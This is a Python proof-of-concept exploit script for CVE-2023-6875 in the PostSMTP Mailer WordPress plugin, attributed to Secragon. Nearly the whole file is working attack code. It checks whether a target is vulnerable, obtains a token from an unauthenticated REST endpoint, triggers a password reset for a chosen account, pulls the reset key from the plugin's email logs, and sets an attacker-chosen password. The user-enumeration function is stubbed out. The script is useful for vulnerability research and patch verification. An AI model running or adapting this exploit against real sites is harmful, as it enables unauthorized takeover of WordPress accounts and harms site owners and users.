# CVE-2023-6875
# PostSMTP Mailer Unauthorized Account Takeover Exploit 
# by Secragon
# PoC for educational/research purposes only
# Use it at your own risk!

import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style
from urllib.parse import urlparse, parse_qs

def check_version(target):
    
    print(Style.RESET_ALL + "Essential Addons version:", end=' ')
    try:
        r = requests.get(f"{target}/wp-content/plugins/post-smtp/readme.txt", verify=False)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]

    except:
        print(Fore.RED + f'error...')
        exit()


    if int(version.replace('.','')) < 288:
        print(Fore.GREEN + f'{version} - vulnerable!')
    else:
        print(Fore.RED + f'{version} - not vulnerable!')
        exit()


def enumerate_users(target, count):

    print(Style.RESET_ALL + "Enumerating users:")
    # last minute change :)
    print(Fore.RED + "... nah... be creative...")
    
    exit()


def exploit(url, username, password):
    print(Style.RESET_ALL + "Setting token:", end=' ')
    r = requests.post(f'{url}/index.php/wp-json/post-smtp/v1/connect-app', headers={'fcm-token': 'Secragon_CyberSec_Services', 'device': 'Device_X'})
    try:
        token = r.json()['data']['fcm_token']
        print(Fore.GREEN + f"{token}");
    except:
        print(Fore.RED + "error")
        exit()
    
    print(Style.RESET_ALL + "Sending reset request:", end=' ')
    r = requests.post(f'{url}/wp-login.php?action=lostpassword',headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=f'user_login={username}&redirect_to=&wp-submit=Get+New+Password', allow_redirects=False)

    if r.status_code == 302:
        print(Fore.GREEN + "done")
    else:
        print(Fore.RED + "error")
        exit()

    print(Style.RESET_ALL + "Stealing the reset key:", end=' ')
    try:
        r = requests.get(f'{url}/index.php/wp-json/post-smtp/v1/get-logs', headers={'fcm-token': f'{token}', 'device': 'Device_X'})
        log_id = r.json()['data'][0]['id']
        r = requests.get(f'{url}/wp-admin/admin.php?access_token={token}&type=log&log_id={log_id}')
        reset_link = re.findall(r'/wp-login.php.*', r.text)
        key = urlparse(reset_link[0])
        rp_key = parse_qs(key.query)['key'][0]
        print(Fore.GREEN + f"{rp_key}")
    except:
        print(Fore.RED + "error")
        exit()


    print(Style.RESET_ALL + f"Changing the password for {username}:", end=' ')
    s = requests.Session()
    r = s.get(f'{url}{reset_link[0]}')
    r = s.post(f'{url}/wp-login.php?action=resetpass', headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=f'pass1={password}&pass2={password}&rp_key={rp_key}&wp-submit=Save+Password')

    if r.status_code == 200:
        print(Fore.GREEN + "done")
        print()
        print(Style.RESET_ALL + "All set! You can now login using the following credentials:")
        print(f'Username: {username}')
        print(f'Password: {password}')
        print()
    else:
        print(Fore.RED + "error")
        exit()



print()
print(Fore.BLUE + "\t\t --- PostSMTP Mailer Exploit ---")
print("\t\t (unauthorized account takeover)")
print(Fore.RED + "\t\t\t\t   by gbrsh@secragon & gnomer0x@secragon")
print(Style.RESET_ALL)


parser = argparse.ArgumentParser(	
									description='Exploit for CVE-2023-6875.',
									epilog='Use -s option to scan for accounts. No exploitation will be triggered.'
								)


parser.add_argument('url', help='http://wphost')
parser.add_argument('-s', '--scan', required=False, type=int, help="Accounts scan mode. Value = max Id to scan.")
parser.add_argument('-u', '--username', required=False, help="Account to takeover")
parser.add_argument('-p', '--password', required=False, help="New password for the account")



if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

args = parser.parse_args()

if args.scan:
	enumerate_users(args.url, args.scan)
     
#if args.password.....

check_version(args.url)
exploit(args.url, args.username, args.password)
